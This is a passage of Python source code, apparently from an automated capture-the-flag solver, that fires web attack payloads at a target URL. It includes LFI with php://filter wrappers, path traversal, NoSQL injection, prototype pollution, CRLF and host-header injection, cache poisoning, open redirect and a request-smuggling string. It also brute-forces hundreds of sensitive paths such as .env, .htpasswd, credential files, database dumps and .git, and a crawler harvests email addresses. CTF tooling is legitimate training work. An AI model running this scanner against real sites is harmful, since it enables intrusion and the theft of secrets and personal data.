                    response = self.session.get(url, params={param: payload}, timeout=self.timeout)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Path traversal on {param}")
                        return flag
                except:
                    pass
        
        return None
    
    def _test_lfi(self, url: str, result: ChallengeResult) -> str:
        """Test for Local File Inclusion with wrapper abuse"""
        result.add_log("Testing LFI with wrappers...")
        
        params_to_test = ['file', 'page', 'path', 'include', 'document', 'folder', 'root', 'pg', 'style', 'template', 'lang', 'language']
        
        for param in params_to_test:
            for payload in self.LFI_PAYLOADS:
                try:
                    response = self.session.get(url, params={param: payload}, timeout=self.timeout)
                    
                    # Check for base64 encoded content
                    if 'php://filter' in payload and 'base64' in payload:
                        try:
                            # Try to decode base64 from response
                            decoded = base64.b64decode(response.text.strip()).decode('utf-8', errors='ignore')
                            flag = self.extract_flag(decoded)
                            if flag:
                                result.add_log(f"LFI with PHP filter on {param}")
                                return flag
                        except:
                            pass
                    
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"LFI successful on {param}")
                        return flag
                    
                    # Check for /etc/passwd content
                    if 'root:' in response.text and '/bin/' in response.text:
                        result.add_log(f"LFI confirmed on {param} (passwd readable)")
                except:
                    pass
        
        return None
    
    def _test_common_paths(self, url: str, result: ChallengeResult) -> str:
        """Test common paths for flags and sensitive files"""
        result.add_log("Testing common paths...")
        
        paths = [
            '/flag.txt', '/flag', '/flag.php', '/getflag',
            '/admin', '/admin/', '/admin/flag', '/admin/flag.txt',
            '/secret', '/secret.txt', '/secret/', '/secrets/',
            '/backup', '/backup/', '/backup.sql', '/backup.zip',
            '/config', '/config.php', '/config.json', '/config.yml',
            '/api', '/api/flag', '/api/v1/flag', '/api/admin',
            '/debug', '/debug/', '/test', '/test/',
            '/.env', '/.git/config', '/.svn/entries',
            '/phpinfo.php', '/info.php', '/server-status',
            '/console', '/shell', '/cmd', '/exec',
            '/uploads/', '/files/', '/static/flag.txt',
            '/source', '/src', '/app', '/application',
        ]
        
        base_url = url.rstrip('/')
        for path in paths:
            try:
                test_url = urljoin(base_url, path)
                response = self.session.get(test_url, timeout=self.timeout)
                if response.status_code == 200:
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Found flag at: {path}")
                        return flag
            except:
                pass
        
        return None
    
    def _test_backup_files(self, url: str, result: ChallengeResult) -> str:
        """Test for backup files"""
        result.add_log("Testing backup files...")
        
        parsed = urlparse(url)
        base_path = parsed.path if parsed.path else '/'
        
        backup_extensions = [
            '.bak', '.backup', '.old', '.orig', '.save', '.swp', '.swo',
            '~', '.copy', '.tmp', '.temp', '.1', '.2',
            '.php.bak', '.php~', '.php.old', '.php.swp',
        ]
        
        # Test backup of current page
        for ext in backup_extensions:
            try:
                backup_url = f"{parsed.scheme}://{parsed.netloc}{base_path}{ext}"
                response = self.session.get(backup_url, timeout=self.timeout)
                if response.status_code == 200:
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Found flag in backup: {ext}")
                        return flag
            except:
                pass
        
        return None
    
    def _test_git_exposure(self, url: str, result: ChallengeResult) -> str:
        """Test for exposed .git directory"""
        result.add_log("Testing .git exposure...")
        
        base_url = url.rstrip('/')
        git_paths = [
            '/.git/config', '/.git/HEAD', '/.git/index',
            '/.git/logs/HEAD', '/.git/refs/heads/master',
            '/.gitignore', '/.git/COMMIT_EDITMSG',
        ]
        
        for path in git_paths:
            try:
                response = self.session.get(urljoin(base_url, path), timeout=self.timeout)
                if response.status_code == 200:
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Found flag in git: {path}")
                        return flag
                    
                    if '[core]' in response.text or 'ref:' in response.text:
                        result.add_log("Git repository exposed!")
            except:
                pass
        
        return None
    
    def _test_parameter_pollution(self, url: str, result: ChallengeResult) -> str:
        """Test for HTTP Parameter Pollution"""
        result.add_log("Testing parameter pollution...")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params:
            try:
                # Duplicate parameter with different values
                test_url = f"{url}&{param_name}=admin&{param_name}=true"
                response = self.session.get(test_url, timeout=self.timeout)
                flag = self.extract_flag(response.text)
                if flag:
                    result.add_log(f"Parameter pollution on {param_name}")
                    return flag
            except:
                pass
        
        return None
    
    def _test_idor(self, url: str, result: ChallengeResult) -> str:
        """Test for Insecure Direct Object Reference"""
        result.add_log("Testing IDOR...")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Test numeric parameters
        for param_name, values in params.items():
            for value in values:
                if value.isdigit():
                    # Try adjacent IDs
                    for test_id in [0, 1, 2, int(value) - 1, int(value) + 1, 100, 1000]:
                        try:
                            test_params = params.copy()
                            test_params[param_name] = [str(test_id)]
                            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                            
                            response = self.session.get(test_url, timeout=self.timeout)
                            flag = self.extract_flag(response.text)
                            if flag:
                                result.add_log(f"IDOR found on {param_name}={test_id}")
                                return flag
                        except:
                            pass
        
        # Test path-based IDOR
        path_parts = parsed.path.split('/')
        for i, part in enumerate(path_parts):
            if part.isdigit():
                for test_id in [0, 1, 2, int(part) - 1, int(part) + 1]:
                    try:
                        new_parts = path_parts.copy()
                        new_parts[i] = str(test_id)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{'/'.join(new_parts)}"
                        
                        response = self.session.get(test_url, timeout=self.timeout)
                        flag = self.extract_flag(response.text)
                        if flag:
                            result.add_log(f"Path IDOR found at position {i}")
                            return flag
                    except:
                        pass
        
        return None
    
    def _test_nosql_injection(self, url: str, result: ChallengeResult) -> str:
        """Test for NoSQL injection"""
        result.add_log("Testing NoSQL injection...")
        
        nosql_payloads = [
            # MongoDB
            {"$gt": ""},
            {"$ne": ""},
            {"$regex": ".*"},
            {"$where": "1==1"},
            # String payloads
            '{"$gt": ""}',
            '{"$ne": ""}',
            "' || '1'=='1",
            "admin'||'1'=='1",
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params:
            for payload in nosql_payloads:
                try:
                    if isinstance(payload, dict):
                        payload = json.dumps(payload)
                    
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, timeout=self.timeout)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"NoSQL injection on {param_name}")
                        return flag
                except:
                    pass
        
        # Test POST with JSON
        for payload in nosql_payloads:
            try:
                if isinstance(payload, str):
                    data = {"username": payload, "password": payload}
                else:
                    data = {"username": payload, "password": payload}
                
                response = self.session.post(url, json=data, timeout=self.timeout)
                flag = self.extract_flag(response.text)
                if flag:
                    result.add_log("NoSQL injection via POST")
                    return flag
            except:
                pass
        
        return None
    
    def _test_graphql(self, url: str, result: ChallengeResult) -> str:
        """Test for GraphQL vulnerabilities"""
        result.add_log("Testing GraphQL...")
        
        graphql_endpoints = ['/graphql', '/graphiql', '/api/graphql', '/v1/graphql']
        
        base_url = url.rstrip('/')
        
        for endpoint in graphql_endpoints:
            try:
                gql_url = urljoin(base_url, endpoint)
                
                # Introspection query
                introspection = {
                    "query": """
                    {
                        __schema {
                            types {
                                name
                                fields {
                                    name
                                }
                            }
                        }
                    }
                    """
                }
                
                response = self.session.post(gql_url, json=introspection, timeout=self.timeout)
                
                if response.status_code == 200:
                    result.add_log(f"GraphQL endpoint found: {endpoint}")
                    
                    flag = self.extract_flag(response.text)
                    if flag:
                        return flag
                    
                    # Try to find flag-related queries
                    data = response.json()
                    types = data.get('data', {}).get('__schema', {}).get('types', [])
                    
                    for t in types:
                        type_name = t.get('name', '').lower()
                        if 'flag' in type_name or 'secret' in type_name:
                            # Query this type
                            query = {"query": f"{{ {t['name']} }}"}
                            resp = self.session.post(gql_url, json=query, timeout=self.timeout)
                            flag = self.extract_flag(resp.text)
                            if flag:
                                return flag
            except:
                pass
        
        return None
    
    def _test_websocket(self, url: str, result: ChallengeResult) -> str:
        """Test for WebSocket vulnerabilities"""
        result.add_log("Testing WebSocket...")
        
        # Convert HTTP URL to WebSocket URL
        ws_url = url.replace('http://', 'ws://').replace('https://', 'wss://')
        
        try:
            import websocket
            
            ws = websocket.create_connection(ws_url, timeout=5)
            
            # Send test messages
            test_messages = [
                'flag',
                '{"action": "getFlag"}',
                '{"type": "flag"}',
                '{"cmd": "flag"}',
                'admin',
            ]
            
            for msg in test_messages:
                try:
                    ws.send(msg)
                    response = ws.recv()
                    flag = self.extract_flag(response)
                    if flag:
                        result.add_log("Found flag via WebSocket")
                        return flag
                except:
                    pass
            
            ws.close()
        except ImportError:
            result.add_log("websocket-client not available")
        except:
            pass
        
        return None
    
    def _test_cors(self, url: str, result: ChallengeResult) -> str:
        """Test for CORS misconfiguration"""
        result.add_log("Testing CORS...")
        
        origins = [
            'https://evil.com',
            'null',
            url,  # Reflected origin
        ]
        
        for origin in origins:
            try:
                headers = {'Origin': origin}
                response = self.session.get(url, headers=headers, timeout=self.timeout)
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '')
                
                if acao == '*' or acao == origin:
                    result.add_log(f"CORS misconfiguration: {acao}")
                    
                    if acac.lower() == 'true':
                        result.add_log("Credentials allowed!")
                
                flag = self.extract_flag(response.text)
                if flag:
                    return flag
            except:
                pass
        
        return None
    
    def _test_host_header(self, url: str, result: ChallengeResult) -> str:
        """Test for Host header injection"""
        result.add_log("Testing Host header injection...")
        
        parsed = urlparse(url)
        
        host_payloads = [
            'evil.com',
            f'{parsed.netloc}.evil.com',
            f'evil.com/{parsed.netloc}',
            'localhost',
            '127.0.0.1',
        ]
        
        for host in host_payloads:
            try:
                headers = {'Host': host}
                response = self.session.get(url, headers=headers, timeout=self.timeout)
                
                flag = self.extract_flag(response.text)
                if flag:
                    result.add_log(f"Host header injection with: {host}")
                    return flag
            except:
                pass
        
        return None
    
    def _test_cache_poisoning(self, url: str, result: ChallengeResult) -> str:
        """Test for cache poisoning"""
        result.add_log("Testing cache poisoning...")
        
        cache_headers = [
            ('X-Forwarded-Host', 'evil.com'),
            ('X-Forwarded-Scheme', 'nothttps'),
            ('X-Original-URL', '/admin'),
            ('X-Rewrite-URL', '/admin'),
        ]
        
        for header, value in cache_headers:
            try:
                headers = {header: value}
                response = self.session.get(url, headers=headers, timeout=self.timeout)
                
                flag = self.extract_flag(response.text)
                if flag:
                    result.add_log(f"Cache poisoning with {header}")
                    return flag
            except:
                pass
        
        return None
    
    def _test_prototype_pollution(self, url: str, result: ChallengeResult) -> str:
        """Test for prototype pollution"""
        result.add_log("Testing prototype pollution...")
        
        payloads = [
            {"__proto__": {"admin": True}},
            {"constructor": {"prototype": {"admin": True}}},
            {"__proto__": {"isAdmin": True}},
        ]
        
        for payload in payloads:
            try:
                response = self.session.post(url, json=payload, timeout=self.timeout)
                flag = self.extract_flag(response.text)
                if flag:
                    result.add_log("Prototype pollution successful")
                    return flag
            except:
                pass
        
        return None
    
    def _test_request_smuggling(self, url: str, result: ChallengeResult) -> str:
        """Test for HTTP request smuggling"""
        result.add_log("Testing request smuggling...")
        
        # CL.TE payload
        smuggle_payload = (
            "POST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "G"
        )
        
        # This is a detection only - actual exploitation is complex
        result.add_log("Request smuggling detection requires manual testing")
        
        return None
    
    def _test_open_redirect(self, url: str, result: ChallengeResult) -> str:
        """Test for open redirect"""
        result.add_log("Testing open redirect...")
        
        redirect_params = ['url', 'redirect', 'next', 'return', 'returnUrl', 'goto', 'dest', 'destination', 'redir', 'redirect_uri', 'continue']
        redirect_payloads = [
            'https://evil.com',
            '//evil.com',
            '/\\evil.com',
            'https:evil.com',
        ]
        
        for param in redirect_params:
            for payload in redirect_payloads:
                try:
                    response = self.session.get(url, params={param: payload}, 
                                               timeout=self.timeout, allow_redirects=False)
                    
                    location = response.headers.get('Location', '')
                    if 'evil.com' in location:
                        result.add_log(f"Open redirect on {param}")
                    
                    flag = self.extract_flag(response.text)
                    if flag:
                        return flag
                except:
                    pass
        
        return None
    
    def _test_crlf_injection(self, url: str, result: ChallengeResult) -> str:
        """Test for CRLF injection"""
        result.add_log("Testing CRLF injection...")
        
        crlf_payloads = [
            '%0d%0aSet-Cookie:crlf=injection',
            '%0d%0aX-Injected:header',
            '\r\nSet-Cookie:crlf=injection',
            '%0d%0a%0d%0a<script>alert(1)</script>',
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params:
            for payload in crlf_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Check for injected headers
                    if 'crlf' in str(response.headers).lower() or 'X-Injected' in response.headers:
                        result.add_log(f"CRLF injection on {param_name}")
                    
                    flag = self.extract_flag(response.text)
                    if flag:
                        return flag
                except:
                    pass
        
        return None
    
    def _test_race_condition(self, url: str, result: ChallengeResult) -> str:
        """Test for race conditions"""
        result.add_log("Testing race conditions...")
        
        try:
            import concurrent.futures
            
            def make_request():
                try:
                    return self.session.get(url, timeout=self.timeout)
                except:
                    return None
            
            # Send multiple concurrent requests
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(make_request) for _ in range(10)]
                
                for future in concurrent.futures.as_completed(futures):
                    response = future.result()
                    if response:
                        flag = self.extract_flag(response.text)
                        if flag:
                            result.add_log("Race condition exploitation successful")
                            return flag
        except:
            pass
        
        return None
    
    def extract_all_paths(self, url: str, depth: int = 2, log_result: ChallengeResult = None) -> Dict[str, Any]:
        """
        Extract all paths, directories, and resources from a website.
        
        Args:
            url: Target URL to scan
            depth: How deep to crawl (default 2)
            log_result: Optional ChallengeResult for logging
            
        Returns:
            Dictionary containing all discovered paths and resources
        """
        def log(msg):
            if log_result and hasattr(log_result, 'add_log'):
                log_result.add_log(msg)
        
        log(f"Extracting paths from: {url}")
        
        parsed_base = urlparse(url)
        base_url = f"{parsed_base.scheme}://{parsed_base.netloc}"
        
        # Initialize result structure
        extracted = {
            'base_url': base_url,
            'pages': set(),           # HTML pages
            'scripts': set(),         # JavaScript files
            'stylesheets': set(),     # CSS files
            'images': set(),          # Image files
            'documents': set(),       # PDF, DOC, etc.
            'api_endpoints': set(),   # API endpoints
            'forms': [],              # Form actions
            'links': set(),           # All links
            'directories': set(),     # Discovered directories
            'parameters': set(),      # URL parameters found
            'emails': set(),          # Email addresses
            'subdomains': set(),      # Subdomains found
            'external_links': set(),  # External links
            'hidden_paths': set(),    # Paths found in JS/comments
            'robots_paths': set(),    # Paths from robots.txt
            'sitemap_paths': set(),   # Paths from sitemap
        }
        
        visited = set()
        to_visit = [(url, 0)]
        
        while to_visit:
            current_url, current_depth = to_visit.pop(0)
            
            if current_url in visited or current_depth > depth:
                continue
            
            visited.add(current_url)
            
            try:
                response = self.session.get(current_url, timeout=self.timeout)
                if response.status_code != 200:
                    continue
                
                content_type = response.headers.get('content-type', '')
                
                if 'text/html' not in content_type and 'application/xhtml' not in content_type:
                    continue
                
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extract links from <a> tags
                for a in soup.find_all('a', href=True):
                    href = a['href']
                    full_url = urljoin(current_url, href)
                    parsed = urlparse(full_url)
                    
                    # Check if same domain
                    if parsed.netloc == parsed_base.netloc or not parsed.netloc:
                        path = parsed.path or '/'
                        extracted['links'].add(path)
                        extracted['pages'].add(path)
                        
                        # Extract directory
                        if '/' in path:
                            dir_path = '/'.join(path.split('/')[:-1])
                            if dir_path:
                                extracted['directories'].add(dir_path + '/')
                        
                        # Extract parameters
                        if parsed.query:
                            for param in parse_qs(parsed.query).keys():
                                extracted['parameters'].add(param)
                        
                        # Add to crawl queue
                        if current_depth < depth and full_url not in visited:
                            to_visit.append((full_url, current_depth + 1))
                    else:
                        extracted['external_links'].add(full_url)
                        # Check for subdomains
                        if parsed_base.netloc in parsed.netloc:
                            extracted['subdomains'].add(parsed.netloc)
                
                # Extract scripts
                for script in soup.find_all('script', src=True):
                    src = script['src']
                    full_url = urljoin(current_url, src)
                    parsed = urlparse(full_url)
                    if parsed.netloc == parsed_base.netloc or not parsed.netloc:
                        extracted['scripts'].add(parsed.path)
                
                # Extract stylesheets
                for link in soup.find_all('link', rel='stylesheet'):
                    href = link.get('href')
                    if href:
                        full_url = urljoin(current_url, href)
                        parsed = urlparse(full_url)
                        if parsed.netloc == parsed_base.netloc or not parsed.netloc:
                            extracted['stylesheets'].add(parsed.path)
                
                # Extract images
                for img in soup.find_all('img', src=True):
                    src = img['src']
                    full_url = urljoin(current_url, src)
                    parsed = urlparse(full_url)
                    if parsed.netloc == parsed_base.netloc or not parsed.netloc:
                        extracted['images'].add(parsed.path)
                
                # Extract forms
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    method = form.get('method', 'GET').upper()
                    inputs = []
                    for inp in form.find_all(['input', 'textarea', 'select']):
                        inp_name = inp.get('name')
                        inp_type = inp.get('type', 'text')
                        if inp_name:
                            inputs.append({'name': inp_name, 'type': inp_type})
                            extracted['parameters'].add(inp_name)
                    
                    extracted['forms'].append({
                        'action': urljoin(current_url, action) if action else current_url,
                        'method': method,
                        'inputs': inputs
                    })
                
                # Extract paths from inline JavaScript
                for script in soup.find_all('script'):
                    if script.string:
                        js_paths = self._extract_paths_from_js(script.string)
                        extracted['hidden_paths'].update(js_paths)
                
                # Extract emails
                email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
                emails = re.findall(email_pattern, response.text)
                extracted['emails'].update(emails)
                
                # Extract API endpoints from JavaScript
                api_patterns = [
                    r'["\']/(api|v\d+)/[^"\']+["\']',
                    r'fetch\s*\(\s*["\']([^"\']+)["\']',
                    r'axios\.[a-z]+\s*\(\s*["\']([^"\']+)["\']',
                    r'\.ajax\s*\(\s*\{[^}]*url\s*:\s*["\']([^"\']+)["\']',
                ]
                for pattern in api_patterns:
                    matches = re.findall(pattern, response.text)
                    for match in matches:
                        if isinstance(match, tuple):
                            match = match[0]
                        if match.startswith('/'):
                            extracted['api_endpoints'].add(match)
                
            except Exception as e:
                log(f"Error crawling {current_url}: {e}")
        
        # Check robots.txt
        try:
            robots_url = base_url + '/robots.txt'
            response = self.session.get(robots_url, timeout=5)
            if response.status_code == 200:
                for line in response.text.split('\n'):
                    if 'Disallow:' in line or 'Allow:' in line:
                        path = line.split(':', 1)[1].strip()
                        if path and path != '/':
                            extracted['robots_paths'].add(path)
                    if 'Sitemap:' in line:
                        sitemap_url = line.split(':', 1)[1].strip()
                        extracted['sitemap_paths'].add(sitemap_url)
        except:
            pass
        
        # Check sitemap.xml
        try:
            sitemap_url = base_url + '/sitemap.xml'
            response = self.session.get(sitemap_url, timeout=5)
            if response.status_code == 200:
                loc_pattern = r'<loc>([^<]+)</loc>'
                locs = re.findall(loc_pattern, response.text)
                for loc in locs:
                    parsed = urlparse(loc)
                    extracted['sitemap_paths'].add(parsed.path)
        except:
            pass
        
        # Brute force common directories
        common_dirs = [
            '/admin/', '/api/', '/assets/', '/backup/', '/config/', '/css/',
            '/data/', '/debug/', '/docs/', '/files/', '/fonts/', '/images/',
            '/img/', '/includes/', '/js/', '/lib/', '/logs/', '/media/',
            '/private/', '/public/', '/scripts/', '/static/', '/styles/',
            '/temp/', '/test/', '/tmp/', '/uploads/', '/vendor/', '/wp-admin/',
            '/wp-content/', '/wp-includes/', '/.git/', '/.svn/', '/.env',
        ]
        
        log("Checking common directories...")
        for dir_path in common_dirs:
            try:
                test_url = base_url + dir_path
                response = self.session.get(test_url, timeout=3, allow_redirects=False)
                if response.status_code in [200, 301, 302, 403]:
                    extracted['directories'].add(dir_path)
            except:
                pass
        
        # Check for common files
        common_files = [
            '/index.html', '/index.php', '/default.html', '/home.html',
            '/flag.txt', '/flag', '/secret.txt', '/secret', '/hidden.txt',
            '/config.json', '/config.yaml', '/config.yml', '/settings.json',
            '/package.json', '/composer.json', '/Gemfile', '/requirements.txt',
            '/.htaccess', '/.htpasswd', '/web.config', '/crossdomain.xml',
            '/favicon.ico', '/manifest.json', '/sw.js', '/service-worker.js',
            '/Suspect.png', '/suspect.png', '/image.png', '/photo.png',
            '/morse.wav', '/audio.wav', '/sound.mp3',
            '/app.js', '/main.js', '/script.js', '/config.js', '/bundle.js',
            '/style.css', '/styles.css', '/main.css', '/app.css',
            '/README.md', '/readme.txt', '/CHANGELOG.md', '/LICENSE',
            '/backup.zip', '/backup.sql', '/dump.sql', '/database.sql',
            '/.env', '/.env.local', '/.env.production', '/.env.development',
            # EXPANDED FILE LIST - ALL EXTENSIONS
            # Text files
            '/flag.txt', '/Flag.txt', '/FLAG.txt', '/secret.txt', '/Secret.txt', '/SECRET.txt',
            '/key.txt', '/Key.txt', '/KEY.txt', '/password.txt', '/Password.txt',
            '/hidden.txt', '/Hidden.txt', '/private.txt', '/Private.txt',
            '/hint.txt', '/Hint.txt', '/clue.txt', '/Clue.txt',
            '/answer.txt', '/Answer.txt', '/solution.txt', '/Solution.txt',
            '/admin.txt', '/Admin.txt', '/user.txt', '/User.txt', '/users.txt',
            '/token.txt', '/Token.txt', '/auth.txt', '/Auth.txt',
            '/data.txt', '/Data.txt', '/info.txt', '/Info.txt',
            '/note.txt', '/Note.txt', '/notes.txt', '/Notes.txt',
            '/log.txt', '/Log.txt', '/error.txt', '/Error.txt',
            '/debug.txt', '/Debug.txt', '/test.txt', '/Test.txt',
            '/config.txt', '/Config.txt', '/settings.txt', '/Settings.txt',
            '/credentials.txt', '/Credentials.txt', '/creds.txt',
            '/version.txt', '/Version.txt', '/build.txt', '/Build.txt',
            # HTML files
            '/flag.html', '/Flag.html', '/secret.html', '/Secret.html',
            '/hidden.html', '/Hidden.html', '/private.html', '/Private.html',
            '/admin.html', '/Admin.html', '/login.html', '/Login.html',
            '/dashboard.html', '/Dashboard.html', '/panel.html', '/Panel.html',
            # PHP files
            '/flag.php', '/Flag.php', '/secret.php', '/Secret.php',
            '/hidden.php', '/Hidden.php', '/private.php', '/Private.php',
            '/admin.php', '/Admin.php', '/login.php', '/Login.php',
            '/config.php', '/Config.php', '/db.php', '/database.php',
            '/info.php', '/phpinfo.php', '/test.php', '/debug.php',
            # JSON files
            '/flag.json', '/Flag.json', '/secret.json', '/Secret.json',
            '/config.json', '/Config.json', '/settings.json', '/Settings.json',
            '/data.json', '/Data.json', '/api.json', '/Api.json',
            '/users.json', '/user.json', '/auth.json', '/token.json',
            '/credentials.json', '/database.json', '/db.json',
            # XML files
            '/flag.xml', '/Flag.xml', '/secret.xml', '/Secret.xml',
            '/config.xml', '/Config.xml', '/settings.xml', '/Settings.xml',
            '/data.xml', '/Data.xml', '/sitemap.xml', '/robots.xml',
            # YAML files
            '/config.yaml', '/config.yml', '/settings.yaml', '/settings.yml',
            '/database.yaml', '/database.yml', '/docker-compose.yml',
            # Log files
            '/error.log', '/access.log', '/debug.log', '/app.log', '/server.log',
            '/system.log', '/application.log', '/security.log',
            # SQL/Database files
            '/backup.sql', '/dump.sql', '/database.sql', '/data.sql',
            '/export.sql', '/db.sql', '/mysql.sql', '/users.sql',
            # Backup files
            '/backup.zip', '/backup.tar.gz', '/backup.bak',
            '/site.zip', '/www.zip', '/web.zip', '/source.zip',
            '/data.zip', '/files.zip', '/archive.zip', '/export.zip',
            # Media files
            '/flag.png', '/Flag.png', '/secret.png', '/Secret.png',
            '/hidden.png', '/Hidden.png', '/image.png', '/Image.png',
            '/flag.jpg', '/secret.jpg', '/hidden.jpg', '/image.jpg',
            '/morse.wav', '/code.wav', '/signal.wav', '/message.wav',
            '/audio.mp3', '/sound.mp3', '/music.mp3',
            # Markdown files
            '/flag.md', '/Flag.md', '/secret.md', '/Secret.md',
            '/README.md', '/readme.md', '/CHANGELOG.md', '/changelog.md',
            '/INSTALL.md', '/install.md', '/TODO.md', '/todo.md',
            '/NOTES.md', '/notes.md', '/HELP.md', '/help.md',
            # No extension files
            '/flag', '/Flag', '/FLAG', '/secret', '/Secret', '/SECRET',
            '/key', '/Key', '/KEY', '/password', '/Password', '/PASSWORD',
            '/hidden', '/Hidden', '/HIDDEN', '/private', '/Private',
            '/hint', '/Hint', '/clue', '/Clue', '/answer', '/Answer',
            '/token', '/Token', '/auth', '/Auth', '/credentials',
            # CTF SPECIFIC: Numbered files (very common in CTF challenges!)
            '/image1.txt', '/image2.txt', '/image3.txt', '/image4.txt', '/image5.txt',
            '/Image1.txt', '/Image2.txt', '/Image3.txt', '/Image4.txt', '/Image5.txt',
            '/file1.txt', '/file2.txt', '/file3.txt', '/file4.txt', '/file5.txt',
            '/data1.txt', '/data2.txt', '/data3.txt', '/data4.txt', '/data5.txt',
            '/part1.txt', '/part2.txt', '/part3.txt', '/part4.txt', '/part5.txt',
            '/flag1.txt', '/flag2.txt', '/flag3.txt', '/hint1.txt', '/hint2.txt',
            '/clue1.txt', '/clue2.txt', '/clue3.txt', '/secret1.txt', '/secret2.txt',
            # Numbered images that might be text files
            '/image1.png', '/image2.png', '/image3.png', '/image4.png', '/image5.png',
            '/img1.png', '/img2.png', '/img3.png', '/pic1.png', '/pic2.png',
            '/photo1.png', '/photo2.png', '/photo3.png',
            # Cipher/encoded files
            '/cipher.txt', '/cipher1.txt', '/cipher2.txt', '/cipher3.txt',
            '/encoded.txt', '/decoded.txt', '/encrypted.txt', '/decrypted.txt',
            '/morse.txt', '/binary.txt', '/hex.txt', '/base64.txt',
            '/caesar.txt', '/rot13.txt', '/vigenere.txt',
            # CTF challenge files
            '/challenge.txt', '/puzzle.txt', '/riddle.txt', '/mystery.txt',
            '/task.txt', '/mission.txt', '/objective.txt', '/goal.txt',
            # Download/output files
            '/download.txt', '/output.txt', '/result.txt', '/answer.txt',
            '/download.png', '/output.png', '/result.png',
            '/Download.png', '/Output.png', '/Result.png',
        ]
        
        # Also try files in common subdirectories
        subdirs = ['', '/files', '/data', '/static', '/assets', '/public', 
                   '/private', '/hidden', '/secret', '/admin', '/backup',
                   '/uploads', '/downloads', '/docs', '/api', '/config',
                   '/images', '/img', '/pics', '/photos', '/media']
        
        base_files = [
            'flag.txt', 'Flag.txt', 'FLAG.txt', 'secret.txt', 'Secret.txt',
            'key.txt', 'Key.txt', 'password.txt', 'hidden.txt', 'private.txt',
            'hint.txt', 'clue.txt', 'answer.txt', 'data.txt', 'info.txt',
            'flag.html', 'secret.html', 'hidden.html', 'admin.html',
            'flag.php', 'secret.php', 'hidden.php', 'admin.php',
            'flag.json', 'secret.json', 'config.json', 'data.json',
            'flag.xml', 'secret.xml', 'config.xml', 'data.xml',
            'flag', 'secret', 'key', 'password', 'hidden', 'private',
            # CTF numbered files
            'image1.txt', 'image2.txt', 'image3.txt', 'image4.txt', 'image5.txt',
            'file1.txt', 'file2.txt', 'file3.txt', 'data1.txt', 'data2.txt',
            'cipher1.txt', 'cipher2.txt', 'cipher3.txt',
            'cipher1.js', 'cipher2.js', 'cipher3.js',
            'part1.txt', 'part2.txt', 'part3.txt',
            'download.png', 'output.png', 'result.png',
            'download.txt', 'output.txt', 'result.txt',
        ]
        
        # Generate all combinations
        all_files_to_check = set(common_files)
        for subdir in subdirs:
            for base_file in base_files:
                all_files_to_check.add(f"{subdir}/{base_file}")
        
        log(f"Checking {len(all_files_to_check)} files...")
        
        # Use threading for faster file checking
        import concurrent.futures
        
        def check_file(file_path):
            try:
                test_url = base_url + file_path
                response = self.session.get(test_url, timeout=3, allow_redirects=False)
                if response.status_code == 200 and len(response.text) > 0:
                    return file_path
            except:
                pass
            return None
        
        found_files = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_file, f): f for f in all_files_to_check}
            for future in concurrent.futures.as_completed(futures):
                file_result = future.result()
                if file_result:
                    found_files.append(file_result)
        
        # Categorize found files
        for file_path in found_files:
            # Categorize by extension
            ext = file_path.split('.')[-1].lower() if '.' in file_path else ''
            if ext in ['html', 'htm', 'php', 'asp', 'aspx', 'jsp', 'shtml']:
                extracted['pages'].add(file_path)
            elif ext in ['js', 'jsx', 'ts', 'tsx']:
                extracted['scripts'].add(file_path)
            elif ext in ['css', 'scss', 'sass', 'less']:
                extracted['stylesheets'].add(file_path)
            elif ext in ['png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'webp', 'bmp']:
                extracted['images'].add(file_path)
            elif ext in ['pdf', 'doc', 'docx', 'xls', 'xlsx']:
                extracted['documents'].add(file_path)
            elif ext in ['txt', 'text', 'log', 'md', 'markdown', 'rst']:
                extracted['documents'].add(file_path)
            elif ext in ['json', 'xml', 'yaml', 'yml', 'ini', 'cfg', 'conf', 'config']:
                extracted['documents'].add(file_path)
            elif ext in ['sql', 'db', 'sqlite', 'bak', 'backup']:
                extracted['documents'].add(file_path)
            elif ext in ['wav', 'mp3', 'ogg', 'flac', 'mp4', 'webm', 'avi']:
                extracted['documents'].add(file_path)
            elif ext in ['zip', 'tar', 'gz', 'rar', '7z', 'bz2']:
                extracted['documents'].add(file_path)
            elif ext in ['env', 'htaccess', 'htpasswd', 'gitignore']:
                extracted['hidden_paths'].add(file_path)
            elif ext == '':
                # No extension - could be flag, secret, etc.
                extracted['hidden_paths'].add(file_path)
            else:
                extracted['pages'].add(file_path)
        
        log(f"Found {len(found_files)} files")
        
        # Identify suspect files (likely to contain flags or sensitive data)
